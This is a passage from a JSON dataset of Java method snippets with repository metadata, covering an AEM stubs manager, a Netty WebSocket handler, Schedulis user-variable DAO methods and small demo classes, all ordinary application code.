"return_type": "Optional<Stubs>", "snippet": "  public Optional<Stubs<?>> findRunnable(String path) {    return runnables.stream()      .filter(runnable -> isScript(path, runnable) || isMapping(path, runnable))      .findFirst();  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/core/src/main/java/com/cognifide/aem/stubs/core/ConfigurableStubManager.java", "stars": "8", "class": {"name": "ConfigurableStubManager", "extends": null, "implements": ["StubManager", "ResourceChangeListener"], "modifiers": ["public"]}}, {"method_name": "isScript", "params": ["String", "Stubs<?>"], "throws": null, "modifiers": ["private"], "return_type": "boolean", "snippet": "  private boolean isScript(String path, Stubs<?> runnable) {    return wildcardMatch(path, format(\"%s/%s/**/*%s\", getRootPath(), runnable.getId(), config.scriptExtension()));  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/core/src/main/java/com/cognifide/aem/stubs/core/ConfigurableStubManager.java", "stars": "8", "class": {"name": "ConfigurableStubManager", "extends": null, "implements": ["StubManager", "ResourceChangeListener"], "modifiers": ["public"]}}, {"method_name": "isMapping", "params": ["String", "Stubs<?>"], "throws": null, "modifiers": ["private"], "return_type": "boolean", "snippet": "  private boolean isMapping(String path, Stubs<?> runnable) {    return wildcardMatch(path, format(\"%s/%s/**/*%s\", getRootPath(), runnable.getId(), config.mappingExtension()));  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/core/src/main/java/com/cognifide/aem/stubs/core/ConfigurableStubManager.java", "stars": "8", "class": {"name": "ConfigurableStubManager", "extends": null, "implements": ["StubManager", "ResourceChangeListener"], "modifiers": ["public"]}}, {"method_name": "isScript", "params": ["String"], "throws": null, "modifiers": ["private"], "return_type": "boolean", "snippet": "  private boolean isScript(String path) {    return isScriptExtension(path) && isNotExcludedPath(path);  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/core/src/main/java/com/cognifide/aem/stubs/core/ConfigurableStubManager.java", "stars": "8", "class": {"name": "ConfigurableStubManager", "extends": null, "implements": ["StubManager", "ResourceChangeListener"], "modifiers": ["public"]}}, {"method_name": "mapAll", "params": ["StubReload", "Stubs<?>"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void mapAll(StubReload reload, Stubs<?> runnable) {    final String rootPath = format(\"%s/%s\", getRootPath(), runnable.getId());    LOG.info(\"Loading AEM Stubs mappings with extension '{}' under path '{}'\", config.mappingExtension(), rootPath);    resolverAccessor.consume(resolver -> {      final AbstractResourceVisitor visitor = new AbstractResourceVisitor() {        @Override        protected void visit(Resource resource) {          if (resource.isResourceType(JcrUtils.NT_FILE) && isMapping(resource.getPath())) {            try {              reload.mappingsTotal++;              runnable.loadMapping(resource);            } catch (Exception e) {              reload.mappingsFailed++;              LOG.error(\"Cannot load AEM Stubs mapping at path '{}'!\", resource.getPath(), e);            }          }        }      };      visitor.accept(resolver.getResource(rootPath));    });  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/core/src/main/java/com/cognifide/aem/stubs/core/ConfigurableStubManager.java", "stars": "8", "class": {"name": "ConfigurableStubManager", "extends": null, "implements": ["StubManager", "ResourceChangeListener"], "modifiers": ["public"]}}, {"method_name": "isMapping", "params": ["String"], "throws": null, "modifiers": ["private"], "return_type": "boolean", "snippet": "  private boolean isMapping(String path) {    return isMappingExtension(path) && isNotExcludedPath(path);  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/core/src/main/java/com/cognifide/aem/stubs/core/ConfigurableStubManager.java", "stars": "8", "class": {"name": "ConfigurableStubManager", "extends": null, "implements": ["StubManager", "ResourceChangeListener"], "modifiers": ["public"]}}, {"method_name": "isScriptExtension", "params": ["String"], "throws": null, "modifiers": ["private"], "return_type": "boolean", "snippet": "  private boolean isScriptExtension(String path) {    return path.endsWith(config.scriptExtension());  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/core/src/main/java/com/cognifide/aem/stubs/core/ConfigurableStubManager.java", "stars": "8", "class": {"name": "ConfigurableStubManager", "extends": null, "implements": ["StubManager", "ResourceChangeListener"], "modifiers": ["public"]}}, {"method_name": "isMappingExtension", "params": ["String"], "throws": null, "modifiers": ["private"], "return_type": "boolean", "snippet": "  private boolean isMappingExtension(String path) {    return path.endsWith(config.mappingExtension());  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/core/src/main/java/com/cognifide/aem/stubs/core/ConfigurableStubManager.java", "stars": "8", "class": {"name": "ConfigurableStubManager", "extends": null, "implements": ["StubManager", "ResourceChangeListener"], "modifiers": ["public"]}}, {"method_name": "isNotExcludedPath", "params": ["String"], "throws": null, "modifiers": ["private"], "return_type": "boolean", "snippet": "  private boolean isNotExcludedPath(String path) {    return Arrays.stream(config.excluded_paths()).noneMatch(p -> wildcardMatch(path, p));  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/core/src/main/java/com/cognifide/aem/stubs/core/ConfigurableStubManager.java", "stars": "8", "class": {"name": "ConfigurableStubManager", "extends": null, "implements": ["StubManager", "ResourceChangeListener"], "modifiers": ["public"]}}, {"method_name": "getRootPath", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getRootPath() {    return config.resource_paths();  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/core/src/main/java/com/cognifide/aem/stubs/core/ConfigurableStubManager.java", "stars": "8", "class": {"name": "ConfigurableStubManager", "extends": null, "implements": ["StubManager", "ResourceChangeListener"], "modifiers": ["public"]}}, {"method_name": "onChange", "params": ["List<ResourceChange>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void onChange(List<ResourceChange> changes) {    if (!config.resetOnChange()) {      return;    }    final List<String> pathsChanged = changes.stream()      .map(ResourceChange::getPath)      .collect(Collectors.toList());    resetRunnables(pathsChanged);  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/core/src/main/java/com/cognifide/aem/stubs/core/ConfigurableStubManager.java", "stars": "8", "class": {"name": "ConfigurableStubManager", "extends": null, "implements": ["StubManager", "ResourceChangeListener"], "modifiers": ["public"]}}, {"method_name": "resetRunnables", "params": ["List<String>"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void resetRunnables(List<String> paths) {    paths.stream()      .map(this::findRunnable)      .flatMap(o -> o.map(Stream::of).orElseGet(Stream::empty))      .distinct()      .forEach(this::reload);  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/core/src/main/java/com/cognifide/aem/stubs/core/ConfigurableStubManager.java", "stars": "8", "class": {"name": "ConfigurableStubManager", "extends": null, "implements": ["StubManager", "ResourceChangeListener"], "modifiers": ["public"]}}, {"method_name": "bindStubs", "params": ["Stubs<?>"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "  protected void bindStubs(Stubs<?> stubs) {    runnables.add(stubs);    reload(stubs);  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/core/src/main/java/com/cognifide/aem/stubs/core/ConfigurableStubManager.java", "stars": "8", "class": {"name": "ConfigurableStubManager", "extends": null, "implements": ["StubManager", "ResourceChangeListener"], "modifiers": ["public"]}}, {"method_name": "unbindStubs", "params": ["Stubs<?>"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "  protected void unbindStubs(Stubs<?> stubs) {    runnables.remove(stubs);  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/core/src/main/java/com/cognifide/aem/stubs/core/ConfigurableStubManager.java", "stars": "8", "class": {"name": "ConfigurableStubManager", "extends": null, "implements": ["StubManager", "ResourceChangeListener"], "modifiers": ["public"]}}, {"method_name": "update", "params": ["Config"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "  protected void update(Config config) {    this.config = config;    reload();  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/core/src/main/java/com/cognifide/aem/stubs/core/ConfigurableStubManager.java", "stars": "8", "class": {"name": "ConfigurableStubManager", "extends": null, "implements": ["StubManager", "ResourceChangeListener"], "modifiers": ["public"]}}, {"method_name": "getHandshaker", "params": [], "throws": null, "modifiers": ["public"], "return_type": "WebSocketServerHandshaker", "snippet": "    public WebSocketServerHandshaker getHandshaker() {        return handshaker;    }", "url": "https://raw.githubusercontent.com/wangxingman/my_project/master/netty_game_app/netty_game_server/src/main/java/com/game/socket/netty/WebSocketHttpServerHandler.java", "stars": "1", "class": {"name": "WebSocketHttpServerHandler", "extends": "SimpleChannelInboundHandler", "implements": null, "modifiers": ["public"]}}, {"method_name": "channelRead0", "params": ["ChannelHandlerContext", "HttpRequest"], "throws": ["Exception"], "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void channelRead0(ChannelHandlerContext ctx, HttpRequest msg) throws Exception {        if (msg instanceof HttpRequest) {            handleHttpRequest(ctx,msg);        }    }", "url": "https://raw.githubusercontent.com/wangxingman/my_project/master/netty_game_app/netty_game_server/src/main/java/com/game/socket/netty/WebSocketHttpServerHandler.java", "stars": "1", "class": {"name": "WebSocketHttpServerHandler", "extends": "SimpleChannelInboundHandler", "implements": null, "modifiers": ["public"]}}, {"method_name": "exceptionCaught", "params": ["ChannelHandlerContext", "Throwable"], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) throws Exception {        cause.printStackTrace();        ctx.close();    }", "url": "https://raw.githubusercontent.com/wangxingman/my_project/master/netty_game_app/netty_game_server/src/main/java/com/game/socket/netty/WebSocketHttpServerHandler.java", "stars": "1", "class": {"name": "WebSocketHttpServerHandler", "extends": "SimpleChannelInboundHandler", "implements": null, "modifiers": ["public"]}}, {"method_name": "channelReadComplete", "params": ["ChannelHandlerContext"], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void channelReadComplete(ChannelHandlerContext ctx) throws Exception {        //\u6d88\u606f\u63a5\u53d7\u5b8c\u6bd5\u5237\u65b0ctx        ctx.flush();    }", "url": "https://raw.githubusercontent.com/wangxingman/my_project/master/netty_game_app/netty_game_server/src/main/java/com/game/socket/netty/WebSocketHttpServerHandler.java", "stars": "1", "class": {"name": "WebSocketHttpServerHandler", "extends": "SimpleChannelInboundHandler", "implements": null, "modifiers": ["public"]}}, {"method_name": "handleHttpRequest", "params": ["ChannelHandlerContext", "HttpRequest"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void handleHttpRequest(ChannelHandlerContext ctx, HttpRequest req) {        //\u7f16\u7801\u5931\u8d25        if (!req.decoderResult().isSuccess()) {            sendHttpResponse(ctx, req, new DefaultFullHttpResponse(HTTP_1_1, BAD_REQUEST));            return;        }        if (req.method() != GET) {            sendHttpResponse(ctx, req, new DefaultFullHttpResponse(HTTP_1_1, FORBIDDEN));            return;        }        if (\"/favicon.ico\".equals(req.uri())) {            FullHttpResponse res = new DefaultFullHttpResponse(HTTP_1_1, NOT_FOUND);            sendHttpResponse(ctx, req, res);            return;        }        if(\"/\".equals(req.uri()) || \"/index.html\".equals(req.uri())) {            String location = getWebSocketLocation(ctx.pipeline(), req);            ByteBuf content = WebSocketServerIndexPage.getContent(location);            FullHttpResponse res = new DefaultFullHttpResponse(HTTP_1_1, OK, content);            res.headers().set(HttpHeaderNames.CONTENT_TYPE, \"text/html; charset=UTF-8\");            HttpUtil.setContentLength(res, content.readableBytes());            sendHttpResponse(ctx, req, res);            return;        } else {            sendHttpResponse(ctx, req, new DefaultFullHttpResponse(HTTP_1_1, NOT_FOUND));        }        //todo netty\u662f\u5982\u4f55\u5efa\u7acb\u63e1\u624b        /*         * 1\u3001\u5ba2\u6237\u7aef\u8fdb\u5165sync\u961f\u5217 ->boosGroup         * 2\u3001\u670d\u52a1\u7aef\u8fd4\u56de\u7ed9\u5ba2\u6237\u7aefack         * 3\u3001\u4ecesync\u961f\u5217\u79fb\u5165\u5230accept\u961f\u5217 ->workGroup         * */        WebSocketServerHandshakerFactory wsFactory = new WebSocketServerHandshakerFactory(                getWebSocketLocation(ctx.pipeline(),req), null, true, 5 * 1024 * 1024);        //\u83b7\u53d6WS\u63e1\u624b\u5bf9\u8c61        handshaker = wsFactory.newHandshaker(req);        if (handshaker == null) {            WebSocketServerHandshakerFactory.sendUnsupportedVersionResponse(ctx.channel());        } else {            handshaker.handshake(ctx.channel(), req);        }        //\u83b7\u53d6\u6e38\u620f\u4fe1\u606f \u53ef\u4ee5\u5c06\u7528\u6237\u7684\u4fe1\u606f\u653e\u5165\u5230redis    }", "url": "https://raw.githubusercontent.com/wangxingman/my_project/master/netty_game_app/netty_game_server/src/main/java/com/game/socket/netty/WebSocketHttpServerHandler.java", "stars": "1", "class": {"name": "WebSocketHttpServerHandler", "extends": "SimpleChannelInboundHandler", "implements": null, "modifiers": ["public"]}}, {"method_name": "getWebSocketLocation", "params": ["ChannelPipeline", "HttpRequest"], "throws": null, "modifiers": ["private"], "return_type": "String", "snippet": "    private String getWebSocketLocation(ChannelPipeline cp,HttpRequest req) {        String location =  req.headers().get(HttpHeaderNames.HOST) + WEBSOCKET_PATH;        if (cp.get(SslHandler.class)!=null) {            return \"wss://\" + location;        } else {            return \"ws://\" + location;        }    }", "url": "https://raw.githubusercontent.com/wangxingman/my_project/master/netty_game_app/netty_game_server/src/main/java/com/game/socket/netty/WebSocketHttpServerHandler.java", "stars": "1", "class": {"name": "WebSocketHttpServerHandler", "extends": "SimpleChannelInboundHandler", "implements": null, "modifiers": ["public"]}}, {"method_name": "sendHttpResponse", "params": ["ChannelHandlerContext", "HttpRequest", "FullHttpResponse"], "throws": null, "modifiers": ["private", "static"], "return_type": "void", "snippet": "    private static void sendHttpResponse(ChannelHandlerContext ctx, HttpRequest req, FullHttpResponse res) {        if(res.status().code() != 200) {            ByteBuf byteBuf = Unpooled.copiedBuffer(res.status().toString(), CharsetUtil.UTF_8);            res.content().writeBytes(byteBuf);            byteBuf.release();            HttpUtil.setContentLength(res,res.content().readableBytes());        }        //ChannelFuture\u4fdd\u5b58channel\u5f02\u6b65\u64cd\u4f5c\u7684\u7ed3\u679c        ChannelFuture f = ctx.channel().writeAndFlush(res);        if(!HttpUtil.isKeepAlive(req) || res.status().code() != 200) {            //\u5f02\u6b65\u76d1\u542c\u56de\u8c03            f.addListener(ChannelFutureListener.CLOSE);        }    }", "url": "https://raw.githubusercontent.com/wangxingman/my_project/master/netty_game_app/netty_game_server/src/main/java/com/game/socket/netty/WebSocketHttpServerHandler.java", "stars": "1", "class": {"name": "WebSocketHttpServerHandler", "extends": "SimpleChannelInboundHandler", "implements": null, "modifiers": ["public"]}}, {"method_name": "getWtssUserTotal", "params": [], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "Integer", "snippet": "    public Integer getWtssUserTotal() throws ExecutorManagerException {        try {            return this.dbOperator.query(UserVariableDao.COUNT_WTSS_USER, new FindWtssUserHandler());        } catch (final SQLException e) {            throw new ExecutorManagerException(\"Failed to statistics the number of user in wtss_user\", e);        }    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/com/webank/wedatasphere/schedulis/common/executor/UserVariableDao.java", "stars": "18", "class": {"name": "UserVariableDao", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "findAllWtssUserPageList", "params": ["String", "int", "int"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "List<WtssUser>", "snippet": "    public List<WtssUser> findAllWtssUserPageList(String searchName, int pageNum, int pageSize)            throws ExecutorManagerException {        List<WtssUser> wtssUserList = null;        String querySQL = UserVariableDao.LOAD_WTSS_USER;        final List<Object> params = new ArrayList<>();        try {            if (searchName != null && !searchName.isEmpty()) {                querySQL += \" WHERE username LIKE ? \";                params.add('%' + searchName + '%');            }            if (pageNum > -1 && pageSize > 0 ) {                querySQL += \" Limit ?, ?\";                params.add(pageNum);                params.add(pageSize);            }            wtssUserList = this.dbOperator.query(querySQL, new FetchWtssUserHandler(), params.toArray());        } catch (final SQLException e) {            throw new ExecutorManagerException(\"Failed to page find user in wtss_user.\", e);        }        return wtssUserList;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/com/webank/wedatasphere/schedulis/common/executor/UserVariableDao.java", "stars": "18", "class": {"name": "UserVariableDao", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "findWtssUserByName", "params": ["String"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "Integer", "snippet": "    public Integer findWtssUserByName(String name) throws ExecutorManagerException{        try {            return this.dbOperator.query(WTSS_USER_IS_EXIST, new FindWtssUserHandler(), name);        } catch (final Exception e) {            throw new ExecutorManagerException(\"findWtssUserByName failed.\", e);        }    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/com/webank/wedatasphere/schedulis/common/executor/UserVariableDao.java", "stars": "18", "class": {"name": "UserVariableDao", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "addUserVariable", "params": ["UserVariable"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void addUserVariable(UserVariable userVariable) throws ExecutorManagerException{        try {            final SQLTransaction<Long> insertAndGetLastID = transOperator -> {                final Connection conn = transOperator.getConnection();                long id = 0;                try {                    transOperator.update(INSERT_USER_VARIABLE, userVariable.getKey(), userVariable.getDescription(), userVariable.getValue(), userVariable.getOwner(), System.currentTimeMillis(), System.currentTimeMillis());                    id = transOperator.getLastInsertId();                    for(WtssUser user: userVariable.getUsers()){                        transOperator.update(INSERT_USER_VARIABLE_USER, (int)id, user.getUserId());                    }                    transOperator.getConnection().commit();                }catch (SQLException sql){                    if(conn != null){                        conn.rollback();                    }                    throw sql;                }                return id;            };            this.dbOperator.transaction(insertAndGetLastID);        } catch (final Exception e) {            throw new ExecutorManagerException(\"addUserVariable failed.\", e);        }    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/com/webank/wedatasphere/schedulis/common/executor/UserVariableDao.java", "stars": "18", "class": {"name": "UserVariableDao", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "deleteUserVariable", "params": ["UserVariable"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "int", "snippet": "    public int deleteUserVariable(UserVariable variable) throws ExecutorManagerException{        try {            final SQLTransaction<Integer> delete = transOperator -> {                final Connection conn = transOperator.getConnection();                Integer ret = 0;                try {                    ret = transOperator.update(DELETE_USER_VARIABLE, variable.getId());                    if(ret == 1){                        transOperator.update(DELETE_USER_VARIABLE_USER, variable.getId());                    }                    transOperator.getConnection().commit();                }catch (SQLException sql){                    if(conn != null){                        conn.rollback();                    }                    throw sql;                }                return ret;            };            return this.dbOperator.transaction(delete);        } catch (final Exception e) {            throw new ExecutorManagerException(\"deleteUserVariable failed.\", e);        }    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/com/webank/wedatasphere/schedulis/common/executor/UserVariableDao.java", "stars": "18", "class": {"name": "UserVariableDao", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "updateUserVariable", "params": ["UserVariable"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "int", "snippet": "    public int updateUserVariable(UserVariable userVariable) throws ExecutorManagerException{        try {            final SQLTransaction<Integer> update = transOperator -> {                final Connection conn = transOperator.getConnection();                Integer ret = 0;                try {                    ret = transOperator.update(UPDATE_USER_VARIABLE, userVariable.getKey(), userVariable.getDescription(), userVariable.getValue(), userVariable.getOwner(), System.currentTimeMillis(), userVariable.getId());                    if(ret == 1){                        transOperator.update(DELETE_USER_VARIABLE_USER, userVariable.getId());                        for(WtssUser user: userVariable.getUsers()){                            transOperator.update(INSERT_USER_VARIABLE_USER, userVariable.getId(), user.getUserId());                        }                    }                    transOperator.getConnection().commit();                }catch (SQLException sql){                    if(conn != null){                        conn.rollback();                    }                    throw sql;                }                return ret;            };            return this.dbOperator.transaction(update);        } catch (final Exception e) {            throw new ExecutorManagerException(\"update userVariable failed.\", e);        }    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/com/webank/wedatasphere/schedulis/common/executor/UserVariableDao.java", "stars": "18", "class": {"name": "UserVariableDao", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "fetchAllUserVariable", "params": ["UserVariable"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "List<UserVariable>", "snippet": "    public List<UserVariable> fetchAllUserVariable(UserVariable userVariable) throws ExecutorManagerException{        List<UserVariable> userVariables = null;        try {            userVariables = this.dbOperator.query(UserVariableDao.FETCH_ALL_USER_VARIABLE, new FetchUserVariableByIdHandler(), userVariable.getOwner(), userVariable.getOwner());        } catch (final Exception e) {            throw new ExecutorManagerException(\"fetch ALL UserVariable failed\", e);        }        return userVariables;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/com/webank/wedatasphere/schedulis/common/executor/UserVariableDao.java", "stars": "18", "class": {"name": "UserVariableDao", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "fetchAllUserVariableByOwnerDepartment", "params": ["Integer"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "List<UserVariable>", "snippet": "    public List<UserVariable> fetchAllUserVariableByOwnerDepartment(Integer departmentId) throws ExecutorManagerException {        List<UserVariable> userVariableList = null;        try {            String querySql = UserVariableHandler.FETCH_USER_VARIABLE_BY_OWNER_DEPARTMENT_ID;            userVariableList = this.dbOperator.query(querySql, new UserVariableHandler(), departmentId);        } catch (SQLException e) {            throw new ExecutorManagerException(\"Failed to find userVariableList, caused by:\", e);        }        return userVariableList;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/com/webank/wedatasphere/schedulis/common/executor/UserVariableDao.java", "stars": "18", "class": {"name": "UserVariableDao", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getUserVariableById", "params": ["Integer"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "UserVariable", "snippet": "    public UserVariable getUserVariableById(Integer id) throws ExecutorManagerException{        List<UserVariable> userVariables = null;        UserVariable userVariable = null;        try {            userVariables = this.dbOperator.query(UserVariableDao.FETCH_USER_VARIABLE_BY_ID, new FetchUserVariableByIdHandler(), id);            if(userVariables.size() != 0){                userVariable = userVariables.get(0);            }        } catch (final Exception e) {            throw new ExecutorManagerException(\"fetch ALL UserVariable failed\", e);        }        return userVariable;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/com/webank/wedatasphere/schedulis/common/executor/UserVariableDao.java", "stars": "18", "class": {"name": "UserVariableDao", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getUserVariableByName", "params": ["String"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "Map<String,String>", "snippet": "    public Map<String, String> getUserVariableByName(String userName) throws ExecutorManagerException{        List<UserVariable> userVariables = null;        Map<String, String> variables = new HashMap<>();        try {            userVariables = this.dbOperator.query(UserVariableDao.FETCH_ALL_USER_VARIABLE, new FetchUserVariableHandler(), userName, userName);            if(userVariables.size() != 0){                for(UserVariable userVariable: userVariables){                    variables.put(userVariable.getKey(), userVariable.getValue());                }            }        } catch (final Exception e) {            throw new ExecutorManagerException(\"fetch ALL UserVariable failed\", e);        }        return variables;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/com/webank/wedatasphere/schedulis/common/executor/UserVariableDao.java", "stars": "18", "class": {"name": "UserVariableDao", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "handle", "params": ["ResultSet"], "throws": ["SQLException"], "modifiers": ["public"], "return_type": "List<WtssUser>", "snippet": "        public List<WtssUser> handle(final ResultSet rs) throws SQLException {            if (!rs.next()) {                return Collections.emptyList();            }            List<WtssUser> wtssUserList = new ArrayList<>();            do {                WtssUser wtssUser = new WtssUser();                String userId = rs.getString(1);                String username = rs.getString(2);                String fullName = rs.getString(3);                wtssUser.setUserId(userId);                wtssUser.setUsername(username);                wtssUser.setFullName(fullName);                wtssUserList.add(wtssUser);            } while (rs.next());            return wtssUserList;        }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/com/webank/wedatasphere/schedulis/common/executor/UserVariableDao.java", "stars": "18", "class": {"name": "FetchWtssUserHandler", "extends": null, "implements": ["ResultSetHandler"], "modifiers": ["public", "static"]}}, {"method_name": "handle", "params": ["ResultSet"], "throws": ["SQLException"], "modifiers": ["public"], "return_type": "Integer", "snippet": "        public Integer handle(final ResultSet rs) throws SQLException {            int count = 0;            if (!rs.next()) {                return count;            }            do {                count = rs.getInt(1);            } while (rs.next());            return count;        }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/com/webank/wedatasphere/schedulis/common/executor/UserVariableDao.java", "stars": "18", "class": {"name": "FindWtssUserHandler", "extends": null, "implements": ["ResultSetHandler"], "modifiers": ["public", "static"]}}, {"method_name": "handle", "params": ["ResultSet"], "throws": ["SQLException"], "modifiers": ["public"], "return_type": "List<UserVariable>", "snippet": "        public List<UserVariable> handle(final ResultSet rs) throws SQLException {            if (!rs.next()) {                return Collections.emptyList();            }            List<UserVariable> userVariables = new ArrayList<>();            Map<Integer, UserVariable> tmp = new HashMap<>();            do {                UserVariable userVariable = new UserVariable();                int id = rs.getInt(1);                userVariable.setId(id);                userVariable.setKey(rs.getString(2));                userVariable.setDescription(rs.getString(3));                userVariable.setValue(rs.getString(4));                userVariable.setOwner(rs.getString(5));                userVariable.setCreateTime(rs.getLong(6));                userVariable.setUpdateTime(rs.getLong(7));                String userName = rs.getString(8);                WtssUser user = new WtssUser();                user.setUserId(userName);                userVariable.getUsers().add(user);                if(tmp.get(id) != null){                    tmp.get(id).getUsers().add(user);                } else {                    tmp.put(id, userVariable);                }            } while (rs.next());            userVariables.addAll(tmp.values());            return userVariables;        }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/com/webank/wedatasphere/schedulis/common/executor/UserVariableDao.java", "stars": "18", "class": {"name": "FetchUserVariableByIdHandler", "extends": null, "implements": ["ResultSetHandler"], "modifiers": ["public", "static"]}}, {"method_name": "handle", "params": ["ResultSet"], "throws": ["SQLException"], "modifiers": ["public"], "return_type": "List<UserVariable>", "snippet": "        public List<UserVariable> handle(final ResultSet rs) throws SQLException {            if (!rs.next()) {                return Collections.emptyList();            }            List<UserVariable> userVariables = new ArrayList<>();            do {                UserVariable userVariable = new UserVariable();                userVariable.setId(rs.getInt(1));                userVariable.setKey(rs.getString(2));                userVariable.setDescription(rs.getString(3));                userVariable.setValue(rs.getString(4));                userVariable.setOwner(rs.getString(5));                userVariable.setCreateTime(rs.getLong(6));                userVariable.setUpdateTime(rs.getLong(7));                userVariables.add(userVariable);            } while (rs.next());            return userVariables;        }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/com/webank/wedatasphere/schedulis/common/executor/UserVariableDao.java", "stars": "18", "class": {"name": "UserVariableHandler", "extends": null, "implements": ["ResultSetHandler"], "modifiers": ["public", "static"]}}, {"method_name": "handle", "params": ["ResultSet"], "throws": ["SQLException"], "modifiers": ["public"], "return_type": "List<UserVariable>", "snippet": "        public List<UserVariable> handle(final ResultSet rs) throws SQLException {            if (!rs.next()) {                return Collections.emptyList();            }            List<UserVariable> userVariables = new ArrayList<>();            do {                UserVariable userVariable = new UserVariable();                userVariable.setId(rs.getInt(1));                userVariable.setKey(rs.getString(2));                userVariable.setDescription(rs.getString(3));                userVariable.setValue(rs.getString(4));                userVariable.setOwner(rs.getString(5));                userVariable.setCreateTime(rs.getLong(6));                userVariable.setUpdateTime(rs.getLong(7));                userVariables.add(userVariable);            } while (rs.next());            return userVariables;        }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/com/webank/wedatasphere/schedulis/common/executor/UserVariableDao.java", "stars": "18", "class": {"name": "FetchUserVariableHandler", "extends": null, "implements": ["ResultSetHandler"], "modifiers": ["public", "static"]}}, {"method_name": "main", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String[] args) {        SpringApplication.run(PaymentMain8001.class);    }", "url": "https://raw.githubusercontent.com/iMine141/springcloud-test/master/cloud-provider-paymeny8001/src/main/java/com/atguigu/springcloud/PaymentMain8001.java", "stars": "1", "class": {"name": "PaymentMain8001", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "List", "params": [], "throws": null, "modifiers": ["public"], "return_type": "ArrayList<Infrastructure>", "snippet": "    public ArrayList<Infrastructure.Person> List() {        return people;    }", "url": "https://raw.githubusercontent.com/emrecengel/FridayClasses/master/src/Infrastructure/Repositories/MemoryPersonRepository.java", "stars": "2", "class": {"name": "MemoryPersonRepository", "extends": null, "implements": ["Infrastructure"], "modifiers": []}}, {"method_name": "Add", "params": ["String", "String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void Add(String firstName, String lastName) {        Infrastructure.Person person = new Infrastructure.Person();        person.firstName = firstName;        person.lastName = lastName;        Add(person);    }", "url": "https://raw.githubusercontent.com/emrecengel/FridayClasses/master/src/Infrastructure/Repositories/MemoryPersonRepository.java", "stars": "2", "class": {"name": "MemoryPersonRepository", "extends": null, "implements": ["Infrastructure"], "modifiers": []}}, {"method_name": "Add", "params": ["Infrastructure"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void Add(Infrastructure.Person value) {        value.id = ++currentIndex;        people.add(value);    }", "url": 